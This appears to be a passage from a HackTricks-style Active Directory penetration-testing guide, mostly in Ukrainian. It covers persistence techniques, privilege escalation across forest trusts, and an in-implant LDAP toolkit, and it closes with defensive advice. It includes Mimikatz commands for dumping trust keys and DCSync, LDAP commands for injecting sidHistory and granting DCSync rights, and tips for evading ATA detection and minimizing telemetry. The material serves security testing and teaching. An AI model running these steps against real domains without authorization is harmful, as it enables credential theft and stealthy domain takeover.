
### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Ви можете створити власний **SSP**, щоб **capture** в **clear text** **credentials**, які використовуються для доступу до машини.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Реєструє **новий Domain Controller** в AD і використовує його для **push attributes** (SIDHistory, SPNs...) на вказані об’єкти **without** залишення будь-яких **logs** про **modifications**. Потрібні DA привілеї і доступ до **root domain**.\
Зауважте, що якщо ви використаєте неправильні дані, з’являться досить помітні логи.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Раніше ми обговорювали, як ескалювати привілеї, якщо у вас є **enough permission to read LAPS passwords**. Проте ці паролі також можна використовувати для **maintain persistence**.\
Дивіться:


{{#ref}}
laps.md
{{#endref}}

## Ескалація привілеїв у Forest — довірчі відносини доменів

Microsoft розглядає **Forest** як межу безпеки. Це означає, що **compromising a single domain could potentially lead to the entire Forest being compromised**.

### Базова інформація

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) — це механізм безпеки, що дозволяє користувачу з одного **domain** отримувати доступ до ресурсів в іншому **domain**. По суті, він створює зв’язок між системами аутентифікації двох доменів, дозволяючи перевіркам аутентифікації проходити безперешкодно. Коли домени налаштовують довіру, вони обмінюються і зберігають певні **keys** у своїх **Domain Controllers (DCs)**, які критично важливі для цілісності довіри.

У типовому сценарії, якщо користувач має намір доступитися до сервісу в **trusted domain**, спочатку він повинен запросити спеціальний квиток, відомий як **inter-realm TGT**, від DC свого домену. Цей TGT шифрується спільним **key**, узгодженим обома доменами. Клієнт потім пред’являє цей TGT **DC of the trusted domain**, щоб отримати сервісний квиток (**TGS**). Після успішної валідації inter-realm TGT DC trusted domain видає TGS, що надає користувачу доступ до сервісу.

**Кроки**:

1. **Client computer** в **Domain 1** починає процес, використовуючи свій **NTLM hash** щоб запросити **Ticket Granting Ticket (TGT)** від свого **Domain Controller (DC1)**.
2. DC1 видає новий TGT, якщо клієнт автентифікований успішно.
3. Клієнт потім запитує **inter-realm TGT** від DC1, який потрібен для доступу до ресурсів у **Domain 2**.
4. Inter-realm TGT шифрується **trust key**, що спільно використовується DC1 і DC2 в рамках двосторонньої domain trust.
5. Клієнт несе inter-realm TGT до **Domain 2's Domain Controller (DC2)**.
6. DC2 перевіряє inter-realm TGT за допомогою спільного trust key і, якщо він валідний, видає **Ticket Granting Service (TGS)** для сервера в Domain 2, до якого клієнт хоче отримати доступ.
7. Нарешті, клієнт пред’являє цей TGS серверу, який зашифрований з використанням hash облікового запису сервера, щоб отримати доступ до сервісу в Domain 2.

### Різні типи довірчих відносин

Важливо зауважити, що **a trust can be 1 way or 2 ways**. У варіанті з двосторонньою довірою обидва домени довіряють один одному, але в **1 way** trust відносинах один з доменів буде **trusted**, а інший — **trusting**. У цьому випадку **ви зможете доступитися лише до ресурсів trusting domain з trusted domain**.

Якщо Domain A trusts Domain B, A — trusting domain, а B — trusted domain. Більше того, в **Domain A** це буде **Outbound trust**; а в **Domain B** — **Inbound trust**.

**Різні trusting relationships**

- **Parent-Child Trusts**: Загальна структура в межах одного forest, де дочірній домен автоматично має двосторонню транзитивну довіру з батьківським доменом. Це означає, що запити аутентифікації можуть проходити між батьківським і дочірнім доменами без перешкод.
- **Cross-link Trusts**: Називаються іноді "shortcut trusts" — встановлюються між дочірніми доменами для прискорення процесів реферальних запитів. У складних лісах (forests) реферальні запити зазвичай мають проходити до кореня лісу, а потім спускатися до цільового домену. Cross-links скорочують цей шлях, що особливо корисно у географічно розподілених середовищах.
- **External Trusts**: Встановлюються між різними, не пов’язаними доменами і за своєю суттю є non-transitive. Згідно з документацією Microsoft, external trusts корисні для доступу до ресурсів у домені за межами поточного forest, який не підключений forest trust. Безпеку підсилюють через SID filtering з external trusts.
- **Tree-root Trusts**: Такі довіри автоматично встановлюються між forest root domain і новим tree root. Хоча зустрічаються рідше, tree-root trusts важливі при додаванні нових дерев доменів до лісу, дозволяючи їм зберігати унікальні імена доменів і забезпечуючи двосторонню транзитивність.
- **Forest Trusts**: Це двостороння транзитивна довіра між двома forest root domains, також застосовується SID filtering для підвищення безпеки.
- **MIT Trusts**: Встановлюються з не-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos доменами. MIT trusts більш спеціалізовані і призначені для інтеграції з Kerberos-системами поза екосистемою Windows.

#### Інші відмінності у **trusting relationships**

- Довіра може бути також **transitive** (A trusts B, B trusts C, тоді A trusts C) або **non-transitive**.
- Довіра може бути встановлена як **bidirectional trust** (обидва довіряють один одному) або як **one-way trust** (лише один довіряє іншому).

### Attack Path

1. **Enumerate** trusting relationships
2. Перевірте, чи який-небудь **security principal** (user/group/computer) має **access** до ресурсів **other domain**, можливо через ACE entries або будучи у групах іншого домену. Шукайте **relationships across domains** (довіра була створена саме для цього).
1. kerberoast у цьому випадку може бути ще одним варіантом.
3. **Compromise** ті **accounts**, які можуть **pivot** між доменами.

Атакуючі можуть отримати доступ до ресурсів в іншому домені через три основні механізми:

- **Local Group Membership**: Принципали можуть бути додані до локальних груп на машинах, наприклад до групи “Administrators” на сервері, що дає їм значний контроль над цією машиною.
- **Foreign Domain Group Membership**: Принципали також можуть бути членами груп у foreign domain. Проте ефективність цього методу залежить від характеру довіри і масштабу групи.
- **Access Control Lists (ACLs)**: Принципали можуть бути вказані в **ACL**, зокрема у ACEs всередині **DACL**, надаючи їм доступ до конкретних ресурсів. Для тих, хто хоче заглибитися в механіку ACLs, DACLs та ACEs, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” є безцінним ресурсом.

### Знайти external users/groups з дозволами

Ви можете перевірити **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, щоб знайти foreign security principals у домені. Це будуть user/group з **an external domain/forest**.

Це можна перевірити в **Bloodhound** або використовуючи powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Інші способи виявлення довірчих відносин між доменами:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Існують **2 довірені ключі**, один для _Child --> Parent_ і інший для _Parent_ --> _Child_.\
> Ви можете перевірити, який із них використовується поточним доменом, за допомогою:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Ескалація до Enterprise admin у child/parent domain шляхом зловживання довірою через SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Розуміння того, як можна експлуатувати Configuration Naming Context (NC), має вирішальне значення. Configuration NC слугує центральним сховищем конфігураційних даних по всьому лісу в середовищах Active Directory (AD). Ці дані реплікуються на кожен Domain Controller (DC) у лісі, причому записувані DC зберігають записувану копію Configuration NC. Щоб експлуатувати це, необхідно мати **SYSTEM privileges на DC**, бажано на child DC.

**Link GPO to root DC site**

Контейнер Sites у Configuration NC містить інформацію про сайти всіх комп'ютерів, приєднаних до домену, у AD forest. Маючи SYSTEM privileges на будь-якому DC, нападники можуть прив'язувати GPOs до root DC sites. Ця дія потенційно компрометує root domain шляхом маніпулювання політиками, застосованими до цих сайтів.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Вектор атаки включає націлювання на привілейовані gMSA в домені. KDS Root key, необхідний для обчислення паролів gMSA, зберігається в Configuration NC. Маючи SYSTEM privileges на будь-якому DC, можна отримати доступ до KDS Root key і обчислити паролі будь-якого gMSA по всьому лісу.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Цей метод вимагає терпіння і очікування створення нових привілейованих AD об'єктів. Маючи SYSTEM privileges, нападник може змінити AD Schema, щоб надати будь-якому користувачу повний контроль над усіма класами. Це може призвести до несанкціонованого доступу та контролю над новоствореними AD об'єктами.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Уразливість ADCS ESC5 націлена на контроль над об'єктами Public Key Infrastructure (PKI) для створення шаблону сертифіката, який дозволяє автентифікуватися як будь-який користувач у лісі. Оскільки PKI об'єкти розташовані в Configuration NC, компрометація записуваного child DC дозволяє виконувати ESC5 атаки.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
У цьому сценарії **на ваш домен надано довіру** з боку зовнішнього домену, що дає вам **невизначені права** над ним. Вам потрібно буде з'ясувати, **які принципали вашого домену мають який доступ до зовнішнього домену**, а потім спробувати exploit це:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Зовнішній лісовий домен — Односторонній (Вихідний)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
У цьому сценарії **ваш домен** довіряє певні **привілеї** обліковому запису з **іншого домену**.

Однак, коли **домен довіряється** довіряючим доменом, довірений домен **створює користувача** з **передбачуваною назвою**, який використовує як **пароль довірчий пароль**. Це означає, що можливо **отримати доступ до користувача з довіряючого домену, щоб проникнути у довірений** та перерахувати його об'єкти і спробувати ескалювати привілеї:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ще один спосіб скомпрометувати довірений домен — знайти [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links), створений в **протилежному напрямку** довіри доменів (що трапляється не дуже часто).

Ще один спосіб скомпрометувати довірений домен — зачекати на машині, куди **користувач з довіреного домену може підключитися** через **RDP**. Потім атакуючий може інжектувати код у процес **RDP session** і **отримати доступ до початкового домену жертви** звідти.\
Крім того, якщо **жертва підключила свій жорсткий диск**, з процесу **RDP session** атакуючий може зберегти **backdoors** у **папці автозавантаження жорсткого диска**. Ця техніка називається **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Ризик атак, що використовують атрибут SID history через міжлісові довіри, зменшується за допомогою SID Filtering, який активований за замовчуванням на всіх міжлісових довірах. Це ґрунтується на припущенні, що внутрішньолісові довіри є безпечними, враховуючи ліс, а не домен, як межу безпеки відповідно до позиції Microsoft.
- Однак є одне застереження: SID Filtering може порушити роботу додатків і доступ користувачів, через що його іноді відключають.

### **Selective Authentication:**

- Для міжлісових довір використання Selective Authentication забезпечує, що користувачі з двох лісів не автентифікуються автоматично. Натомість потрібні явні дозволи, щоб користувачі могли отримати доступ до доменів і серверів у довіряючому домені або лісі.
- Важливо зазначити, що ці заходи не захищають від експлуатації writable Configuration Naming Context (NC) або атак на обліковий запис довіри.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) дозволяють оператору stage нові principals або machine accounts там, де існують OU rights. `add-groupmember`, `set-password`, `add-attribute` та `set-attribute` безпосередньо hijack цілі, щойно знайдено write-property rights.
- Команди, орієнтовані на ACL, такі як `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` та `add-dcsync`, транслюють WriteDACL/WriteOwner на будь-якому AD object у password resets, контроль членства в групах або привілеї реплікації DCSync без залишення PowerShell/ADSI артефактів. `remove-*` counterparts очищають інжектовані ACEs.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` миттєво роблять скомпрометованого користувача Kerberoastable; `add-asreproastable` (UAC toggle) позначає його для AS-REP roasting без торкання пароля.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) переписують `msDS-AllowedToDelegateTo`, UAC flags або `msDS-AllowedToActOnBehalfOfOtherIdentity` з beacon, дозволяючи constrained/unconstrained/RBCD attack paths і усуваючи потребу в remote PowerShell або RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injects привілейовані SIDs у SID history контрольованого principal (see [SID-History Injection](sid-history-injection.md)), забезпечуючи stealthy access inheritance повністю через LDAP/LDAPS.
- `move-object` змінює DN/OU комп’ютерів або користувачів, дозволяючи нападнику перетягнути активи в OUs, де вже існують delegated rights, перед тим як зловживати `set-password`, `add-groupmember` або `add-spn`.
- Тісно сфокусовані команди для видалення (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` тощо) дозволяють швидко відкотити зміни після того, як оператор зібрав credentials або persistence, мінімізуючи telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Рекомендується дозволяти Domain Admins входити тільки на Domain Controllers, уникаючи їх використання на інших хостах.
- **Service Account Privileges**: Сервіси не повинні працювати з Domain Admin (DA) привілеями для підтримки безпеки.
- **Temporal Privilege Limitation**: Для задач, що вимагають DA привілеїв, їх тривалість повинна бути обмежена. Це можна досягти командою: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Аудит Event IDs 2889/3074/3075, а потім примусове LDAP signing плюс LDAPS channel binding на DCs/clients, щоб заблокувати LDAP MITM/relay спроби.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Впровадження deception включає встановлення пасток, таких як decoy users або computers, з характеристиками на кшталт паролів, які не спливають, або позначених як Trusted for Delegation. Детальний підхід включає створення користувачів з певними правами або додавання їх до high privilege groups.
- Практичний приклад використання інструментів: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Більше про розгортання deception techniques можна знайти на [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Підозрілі індикатори включають нетиповий ObjectSID, рідкі логіни, дати створення та низьку кількість bad password attempts.
- **General Indicators**: Порівняння атрибутів потенційних decoy об’єктів з реальними може виявити невідповідності. Інструменти на кшталт [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) можуть допомогти у виявленні таких deception.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Уникнення session enumeration на Domain Controllers, щоб запобігти ATA детекції.
- **Ticket Impersonation**: Використання **aes** keys для створення квитків допомагає уникнути виявлення, не понижуючи до NTLM.
- **DCSync Attacks**: Рекомендується виконувати з не-Domain Controller, щоб уникнути ATA детекції, оскільки пряме виконання з Domain Controller спровокує alerts.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
